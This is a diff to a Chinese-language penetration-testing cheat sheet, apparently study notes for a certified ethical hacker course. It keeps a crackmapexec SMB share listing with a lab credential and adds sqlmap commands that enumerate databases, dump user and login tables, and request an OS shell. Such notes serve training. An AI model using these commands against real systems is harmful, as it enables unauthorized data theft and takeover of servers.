@@ -1,4 +1,4 @@
-### CEHP
+### 掃描與列舉
 
 <details>
   <summary>使用NMAP掃描網路</summary>
@@ -55,4 +55,18 @@
   python3 -m pip install --upgrade impacket
   crackmapexec smb 10.10.10.16 -u martin -p apple --shares
   ```
+</details>
+
+### 掃描與攻擊網頁程式
+
+<details>
+  <summary>參數串改攻擊</summary>
+
+  sqlmap -u "url" --cookie="<cookie>" 
+  sqlmap -u "url" --cookie="<cookie>" --dbs 
+  sqlmap -u "url" --cookie="<cookie>" -D dbname --tables 
+  sqlmap -u "url" --cookie="<cookie>" -D dbname -T users -dump
+  sqlmap -u "url" --cookie="<cookie>" -D dbname -T Login --columns --technique=B 
+  sqlmap -u "url" --cookie="<cookie>" -D dbname -T Login -dump --technique=B 
+  sqlmap -u "url" --cookie="<cookie>" --os-shell
 </details>
